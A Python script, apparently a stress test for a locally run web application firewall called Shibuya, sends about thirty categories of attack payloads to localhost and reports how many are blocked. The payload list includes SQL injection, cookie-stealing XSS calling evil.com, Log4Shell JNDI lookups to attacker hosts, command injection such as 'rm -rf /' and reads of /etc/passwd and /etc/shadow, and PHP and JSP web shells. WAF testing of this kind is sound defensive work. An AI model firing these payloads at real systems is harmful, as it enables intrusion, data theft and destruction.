#!/usr/bin/env python3
"""
=============================================================================
  SHIBUYA WAF - MASSIVE STRESS TEST (30 Attack Types)
=============================================================================
  Tests the WAF against 30 different attack categories, each with multiple
  payloads. Results are collected and a detailed report is generated.
=============================================================================
"""

import urllib.request
import urllib.error
import urllib.parse
import json
import time
import ssl
import sys
from datetime import datetime

WAF_URL = "http://localhost:8080"
TIMEOUT = 10

# ─── 30 ATTACK CATEGORIES ───────────────────────────────────────────────────

ATTACKS = [
    # ━━━ 1. SQL Injection (Classic) ━━━
    {
        "id": 1,
        "name": "SQL Injection - Classic",
        "category": "SQLi",
        "payloads": [
            {"method": "GET", "path": "/search?q=' OR 1=1 --"},
            {"method": "GET", "path": "/user?id=1 UNION SELECT username,password FROM users--"},
            {"method": "POST", "path": "/login", "body": "username=admin'--&password=x"},
        ]
    },
    # ━━━ 2. SQL Injection (Blind) ━━━
    {
        "id": 2,
        "name": "SQL Injection - Blind/Time-Based",
        "category": "SQLi",
        "payloads": [
            {"method": "GET", "path": "/user?id=1 AND SLEEP(5)--"},
            {"method": "GET", "path": "/user?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"},
            {"method": "GET", "path": "/item?id=1 AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)"},
        ]
    },
    # ━━━ 3. XSS Reflected ━━━
    {
        "id": 3,
        "name": "XSS - Reflected",
        "category": "XSS",
        "payloads": [
            {"method": "GET", "path": "/search?q=<script>alert('XSS')</script>"},
            {"method": "GET", "path": "/page?name=<img src=x onerror=alert(1)>"},
            {"method": "GET", "path": "/view?data=<svg/onload=alert('xss')>"},
        ]
    },
    # ━━━ 4. XSS Stored ━━━
    {
        "id": 4,
        "name": "XSS - Stored",
        "category": "XSS",
        "payloads": [
            {"method": "POST", "path": "/comment", "body": '{"text":"<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>"}', "content_type": "application/json"},
            {"method": "POST", "path": "/profile", "body": '{"bio":"<iframe src=javascript:alert(1)>"}', "content_type": "application/json"},
        ]
    },
    # ━━━ 5. XSS DOM-Based ━━━
    {
        "id": 5,
        "name": "XSS - DOM Based",
        "category": "XSS",
        "payloads": [
            {"method": "GET", "path": "/page#<script>alert(document.domain)</script>"},
            {"method": "GET", "path": "/search?q=javascript:alert(1)//"},
            {"method": "GET", "path": "/redirect?url=javascript:alert('XSS')"},
        ]
    },
    # ━━━ 6. Command Injection ━━━
    {
        "id": 6,
        "name": "OS Command Injection",
        "category": "RCE",
        "payloads": [
            {"method": "GET", "path": "/ping?host=;cat /etc/passwd"},
            {"method": "POST", "path": "/exec", "body": "cmd=ls|whoami"},
            {"method": "GET", "path": "/lookup?domain=google.com;rm -rf /"},
            {"method": "GET", "path": "/check?ip=127.0.0.1`id`"},
        ]
    },
    # ━━━ 7. Path Traversal ━━━
    {
        "id": 7,
        "name": "Path Traversal / LFI",
        "category": "LFI",
        "payloads": [
            {"method": "GET", "path": "/file?name=../../../etc/passwd"},
            {"method": "GET", "path": "/download?path=....//....//....//etc/shadow"},
            {"method": "GET", "path": "/view?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        ]
    },
    # ━━━ 8. Remote File Inclusion ━━━
    {
        "id": 8,
        "name": "Remote File Inclusion (RFI)",
        "category": "RFI",
        "payloads": [
            {"method": "GET", "path": "/page?file=http://evil.com/shell.php"},
            {"method": "GET", "path": "/include?template=https://attacker.com/malware.txt"},
        ]
    },
    # ━━━ 9. SSRF ━━━
    {
        "id": 9,
        "name": "Server-Side Request Forgery (SSRF)",
        "category": "SSRF",
        "payloads": [
            {"method": "POST", "path": "/fetch", "body": '{"url":"http://169.254.169.254/latest/meta-data/"}', "content_type": "application/json"},
            {"method": "GET", "path": "/proxy?url=http://localhost:9090/admin"},
            {"method": "POST", "path": "/webhook", "body": '{"callback":"http://127.0.0.1:22/"}', "content_type": "application/json"},
        ]
    },
    # ━━━ 10. LDAP Injection ━━━
    {
        "id": 10,
        "name": "LDAP Injection",
        "category": "Injection",
        "payloads": [
            {"method": "GET", "path": "/search?user=*)(uid=*))(|(uid=*"},
            {"method": "POST", "path": "/auth", "body": "username=admin)(&password=x"},
        ]
    },
    # ━━━ 11. XML External Entity (XXE) ━━━
    {
        "id": 11,
        "name": "XXE - XML External Entity",
        "category": "XXE",
        "payloads": [
            {"method": "POST", "path": "/api/xml", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "content_type": "application/xml"},
            {"method": "POST", "path": "/upload", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>', "content_type": "text/xml"},
        ]
    },
    # ━━━ 12. Log4Shell / JNDI Injection ━━━
    {
        "id": 12,
        "name": "Log4Shell / JNDI Injection",
        "category": "RCE",
        "payloads": [
            {"method": "GET", "path": "/", "headers": {"X-Api-Version": "${jndi:ldap://evil.com/exploit}"}},
            {"method": "GET", "path": "/", "headers": {"User-Agent": "${jndi:rmi://attacker.com:1099/exploit}"}},
            {"method": "GET", "path": "/search?q=${jndi:ldap://evil.com/a}"},
        ]
    },
    # ━━━ 13. HTTP Request Smuggling ━━━
    {
        "id": 13,
        "name": "HTTP Request Smuggling",
        "category": "Protocol",
        "payloads": [
            {"method": "POST", "path": "/", "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "6"}},
        ]
    },
    # ━━━ 14. CRLF Injection ━━━
    {
        "id": 14,
        "name": "CRLF Injection / HTTP Header Injection",
        "category": "Injection",
        "payloads": [
            {"method": "GET", "path": "/redirect?url=http://example.com%0d%0aSet-Cookie:+evil=true"},
            {"method": "GET", "path": "/page?param=value%0d%0aInjected-Header:+malicious"},
        ]
    },
    # ━━━ 15. NoSQL Injection ━━━
    {
        "id": 15,
        "name": "NoSQL Injection",
        "category": "Injection",
        "payloads": [
            {"method": "POST", "path": "/login", "body": '{"username":{"$gt":""},"password":{"$gt":""}}', "content_type": "application/json"},
            {"method": "POST", "path": "/search", "body": '{"query":{"$where":"this.password==\'admin\'"}}', "content_type": "application/json"},
        ]
    },
    # ━━━ 16. Server-Side Template Injection (SSTI) ━━━
    {
        "id": 16,
        "name": "Server-Side Template Injection (SSTI)",
        "category": "RCE",
        "payloads": [
            {"method": "GET", "path": "/render?template={{7*7}}"},
            {"method": "POST", "path": "/preview", "body": "content={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
            {"method": "GET", "path": "/page?name=${7*7}"},
        ]
    },
    # ━━━ 17. Prototype Pollution ━━━
    {
        "id": 17,
        "name": "Prototype Pollution",
        "category": "Injection",
        "payloads": [
            {"method": "POST", "path": "/api/merge", "body": '{"__proto__":{"isAdmin":true}}', "content_type": "application/json"},
            {"method": "POST", "path": "/api/update", "body": '{"constructor":{"prototype":{"role":"admin"}}}', "content_type": "application/json"},
        ]
    },
    # ━━━ 18. HTTP Verb Tampering ━━━
    {
        "id": 18,
        "name": "HTTP Verb Tampering",
        "category": "Protocol",
        "payloads": [
            {"method": "TRACE", "path": "/admin"},
            {"method": "CONNECT", "path": "evil.com:443"},
            {"method": "PROPFIND", "path": "/"},
        ]
    },
    # ━━━ 19. Unicode/Encoding Bypass ━━━
    {
        "id": 19,
        "name": "WAF Bypass - Unicode/Encoding",
        "category": "Evasion",
        "payloads": [
            {"method": "GET", "path": "/search?q=%ef%bc%b3%ef%bc%a5%ef%bc%ac%ef%bc%a5%ef%bc%a3%ef%bc%b4"},  # Unicode ＳＥＬＥＣＴ
            {"method": "GET", "path": "/search?q=SEL%00ECT+*+FROM+users"},
            {"method": "GET", "path": "/search?q=1+un%69on+sel%65ct+1,2,3"},
        ]
    },
    # ━━━ 20. Shellshock ━━━
    {
        "id": 20,
        "name": "Shellshock (CVE-2014-6271)",
        "category": "RCE",
        "payloads": [
            {"method": "GET", "path": "/cgi-bin/test", "headers": {"User-Agent": "() { :; }; echo ; /bin/cat /etc/passwd"}},
            {"method": "GET", "path": "/cgi-bin/status", "headers": {"Referer": "() { :; }; /bin/bash -c 'cat /etc/shadow'"}},
        ]
    },
    # ━━━ 21. Host Header Injection ━━━
    {
        "id": 21,
        "name": "Host Header Injection",
        "category": "Injection",
        "payloads": [
            {"method": "GET", "path": "/reset-password", "headers": {"Host": "evil.com", "X-Forwarded-Host": "evil.com"}},
            {"method": "GET", "path": "/", "headers": {"Host": "localhost\r\nX-Injected: true"}},
        ]
    },
    # ━━━ 22. CSV Injection ━━━
    {
        "id": 22,
        "name": "CSV / Formula Injection",
        "category": "Injection",
        "payloads": [
            {"method": "POST", "path": "/contact", "body": '{"name":"=CMD(\'calc\')","email":"test@test.com"}', "content_type": "application/json"},
            {"method": "POST", "path": "/export", "body": '{"data":"=HYPERLINK(\\"http://evil.com\\",\\"Click\\")"}', "content_type": "application/json"},
        ]
    },
    # ━━━ 23. Open Redirect ━━━
    {
        "id": 23,
        "name": "Open Redirect",
        "category": "Redirect",
        "payloads": [
            {"method": "GET", "path": "/redirect?url=http://evil.com"},
            {"method": "GET", "path": "/goto?next=//evil.com"},
            {"method": "GET", "path": "/out?link=https://evil.com/phishing"},
        ]
    },
    # ━━━ 24. WebShell Upload Attempt ━━━
    {
        "id": 24,
        "name": "WebShell / Malicious File Upload",
        "category": "RCE",
        "payloads": [
            {"method": "POST", "path": "/upload", "body": "<?php system($_GET['cmd']); ?>", "content_type": "application/x-php"},
            {"method": "POST", "path": "/api/files", "body": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "content_type": "application/octet-stream"},
        ]
    },
    # ━━━ 25. GraphQL Abuse ━━━
    {
        "id": 25,
        "name": "GraphQL Introspection & Abuse",
        "category": "API",
        "payloads": [
            {"method": "POST", "path": "/graphql", "body": '{"query":"{__schema{types{name fields{name}}}}"}', "content_type": "application/json"},
            {"method": "POST", "path": "/graphql", "body": '{"query":"query{a1:user(id:1){name}a2:user(id:2){name}a3:user(id:3){name}a4:user(id:4){name}a5:user(id:5){name}a6:user(id:6){name}a7:user(id:7){name}a8:user(id:8){name}a9:user(id:9){name}a10:user(id:10){name}a11:user(id:11){name}a12:user(id:12){name}a13:user(id:13){name}a14:user(id:14){name}a15:user(id:15){name}a16:user(id:16){name}a17:user(id:17){name}a18:user(id:18){name}a19:user(id:19){name}a20:user(id:20){name}a21:user(id:21){name}a22:user(id:22){name}a23:user(id:23){name}a24:user(id:24){name}a25:user(id:25){name}a26:user(id:26){name}a27:user(id:27){name}a28:user(id:28){name}a29:user(id:29){name}a30:user(id:30){name}a31:user(id:31){name}a32:user(id:32){name}a33:user(id:33){name}a34:user(id:34){name}a35:user(id:35){name}a36:user(id:36){name}a37:user(id:37){name}a38:user(id:38){name}a39:user(id:39){name}a40:user(id:40){name}a41:user(id:41){name}a42:user(id:42){name}a43:user(id:43){name}a44:user(id:44){name}a45:user(id:45){name}a46:user(id:46){name}a47:user(id:47){name}a48:user(id:48){name}a49:user(id:49){name}a50:user(id:50){name}a51:user(id:51){name}}"}', "content_type": "application/json"},
        ]
    },
    # ━━━ 26. JWT Manipulation ━━━
    {
        "id": 26,
        "name": "JWT Token Manipulation",
        "category": "Auth",
        "payloads": [
            {"method": "GET", "path": "/api/admin", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."}},
            {"method": "GET", "path": "/api/user", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"}},
        ]
    },
    # ━━━ 27. Mass Assignment ━━━
    {
        "id": 27,
        "name": "Mass Assignment / Parameter Pollution",
        "category": "Injection",
        "payloads": [
            {"method": "POST", "path": "/api/user/register", "body": '{"username":"test","password":"test123","role":"admin","isAdmin":true}', "content_type": "application/json"},
            {"method": "GET", "path": "/search?q=test&q=<script>alert(1)</script>&admin=true&admin=false"},
        ]
    },
    # ━━━ 28. Denial of Service Patterns ━━━
    {
        "id": 28,
        "name": "DoS Attack Patterns",
        "category": "DoS",
        "payloads": [
            {"method": "POST", "path": "/api/data", "body": '{"a":' * 100 + '"x"' + '}' * 100, "content_type": "application/json"},  # Deeply nested JSON
            {"method": "GET", "path": "/search?q=" + "A" * 10000},  # Oversized parameter
            {"method": "POST", "path": "/api/parse", "body": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>', "content_type": "application/xml"},  # XML bomb
        ]
    },
    # ━━━ 29. Scanner/Bot Detection ━━━
    {
        "id": 29,
        "name": "Scanner & Bot Signatures",
        "category": "Recon",
        "payloads": [
            {"method": "GET", "path": "/", "headers": {"User-Agent": "sqlmap/1.6 (http://sqlmap.org)"}},
            {"method": "GET", "path": "/", "headers": {"User-Agent": "nikto/2.1.6"}},
            {"method": "GET", "path": "/", "headers": {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"}},
            {"method": "GET", "path": "/.env"},
            {"method": "GET", "path": "/wp-admin/"},
            {"method": "GET", "path": "/phpmyadmin/"},
            {"method": "GET", "path": "/.git/config"},
        ]
    },
    # ━━━ 30. Multi-Vector Chained Attack ━━━
    {
        "id": 30,
        "name": "Multi-Vector Chained Attack",
        "category": "Advanced",
        "payloads": [
            {"method": "POST", "path": "/api/search", "body": '{"query":"<script>fetch(\'http://evil.com/?\'+document.cookie)</script>\' UNION SELECT * FROM users--"}', "content_type": "application/json",
             "headers": {"X-Forwarded-For": "127.0.0.1", "X-Api-Version": "${jndi:ldap://evil.com/x}"}},
            {"method": "GET", "path": "/admin/../../../etc/passwd?id=1'+OR+1=1--&<script>alert(1)</script>",
             "headers": {"User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'", "Referer": "${jndi:ldap://evil.com/a}"}},
        ]
    },
]


# ─── EXECUTION ENGINE ────────────────────────────────────────────────────────

def send_attack(payload):
    """Send a single attack payload and return the result."""
    method = payload.get("method", "GET")
    path = payload.get("path", "/")
    body = payload.get("body", None)
    custom_headers = payload.get("headers", {})
    content_type = payload.get("content_type", "application/x-www-form-urlencoded")

    url = WAF_URL + path

    try:
        data = body.encode('utf-8') if body else None
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", content_type)
        for k, v in custom_headers.items():
            try:
                req.add_header(k, v)
            except Exception:
                pass

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        response = urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx)
        return {
            "status_code": response.getcode(),
            "blocked": False,
            "error": None,
        }
    except urllib.error.HTTPError as e:
        status = e.code
        blocked = status in (403, 406, 429, 400, 405)
        return {
            "status_code": status,
            "blocked": blocked,
            "error": None,
        }
    except urllib.error.URLError as e:
        return {
            "status_code": 0,
            "blocked": True,  # Connection refused/reset = WAF dropped it
            "error": str(e.reason),
        }
    except Exception as e:
        return {
            "status_code": 0,
            "blocked": True,
            "error": str(e),
        }


def run_tests():
    """Run all 30 attack categories and collect results."""
    print("=" * 72)
    print("  🏯  SHIBUYA WAF - MASSIVE STRESS TEST")
    print(f"  📅  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  🎯  Target: {WAF_URL}")
    print(f"  ⚔️   Attack Categories: {len(ATTACKS)}")
    total_payloads = sum(len(a['payloads']) for a in ATTACKS)
    print(f"  💣  Total Payloads: {total_payloads}")
    print("=" * 72)
    print()

    results = []
    total_blocked = 0
    total_passed = 0
    start_time = time.time()

    for attack in ATTACKS:
        attack_id = attack["id"]
        name = attack["name"]
        category = attack["category"]
        payloads = attack["payloads"]
        
        blocked_count = 0
        payload_results = []

        for i, payload in enumerate(payloads):
            result = send_attack(payload)
            payload_results.append(result)
            
            if result["blocked"]:
                blocked_count += 1
                total_blocked += 1
            else:
                total_passed += 1
            
            time.sleep(0.05)  # Small delay between requests

        block_rate = (blocked_count / len(payloads)) * 100 if payloads else 0
        
        if block_rate == 100:
            status_icon = "🟢"
            verdict = "BLOCKED"
        elif block_rate >= 50:
            status_icon = "🟡"
            verdict = "PARTIAL"
        else:
            status_icon = "🔴"
            verdict = "BYPASSED"

        result_entry = {
            "id": attack_id,
            "name": name,
            "category": category,
            "total_payloads": len(payloads),
            "blocked": blocked_count,
            "passed": len(payloads) - blocked_count,
            "block_rate": block_rate,
            "verdict": verdict,
            "details": payload_results,
        }
        results.append(result_entry)

        print(f"  {status_icon} [{attack_id:2d}/30] {name:<45s} {blocked_count}/{len(payloads)} blocked ({block_rate:5.1f}%) → {verdict}")

    elapsed = time.time() - start_time
    total = total_blocked + total_passed
    overall_rate = (total_blocked / total * 100) if total > 0 else 0

    print()
    print("=" * 72)
    print(f"  📊  RESULTS SUMMARY")
    print(f"  ⏱️   Duration: {elapsed:.1f}s")
    print(f"  💣  Total Attacks: {total}")
    print(f"  🛡️   Blocked: {total_blocked} ({overall_rate:.1f}%)")
    print(f"  ⚠️   Passed: {total_passed} ({100-overall_rate:.1f}%)")
    print("=" * 72)

    return results, {
        "duration_seconds": round(elapsed, 1),
        "total_attacks": total,
        "total_blocked": total_blocked,
        "total_passed": total_passed,
        "overall_block_rate": round(overall_rate, 1),
        "timestamp": datetime.now().isoformat(),
    }


def generate_report(results, summary):
    """Generate a JSON report file."""
    report = {
        "test_info": {
            "name": "Shibuya WAF Massive Stress Test",
            "target": WAF_URL,
            "timestamp": summary["timestamp"],
            "duration_seconds": summary["duration_seconds"],
        },
        "summary": summary,
        "categories": {},
        "attacks": results,
    }

    # Aggregate by category
    cats = {}
    for r in results:
        cat = r["category"]
        if cat not in cats:
            cats[cat] = {"total": 0, "blocked": 0, "passed": 0, "attacks": []}
        cats[cat]["total"] += r["total_payloads"]
        cats[cat]["blocked"] += r["blocked"]
        cats[cat]["passed"] += r["passed"]
        cats[cat]["attacks"].append(r["name"])
    
    for cat, data in cats.items():
        data["block_rate"] = round((data["blocked"] / data["total"] * 100) if data["total"] > 0 else 0, 1)
    
    report["categories"] = cats

    report_path = "/Users/ghostshinobi/Desktop/shibuya/stress_test_report.json"
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print(f"\n  📄 Report saved: {report_path}")
    return report_path, report


if __name__ == "__main__":
    results, summary = run_tests()
    report_path, report = generate_report(results, summary)
    
    # Print category breakdown
    print("\n" + "=" * 72)
    print("  📋  CATEGORY BREAKDOWN")
    print("=" * 72)
    for cat, data in sorted(report["categories"].items(), key=lambda x: x[1]["block_rate"], reverse=True):
        rate = data["block_rate"]
        icon = "🟢" if rate == 100 else ("🟡" if rate >= 50 else "🔴")
        print(f"  {icon} {cat:<15s}  {data['blocked']}/{data['total']} blocked  ({rate}%)")
    print("=" * 72)
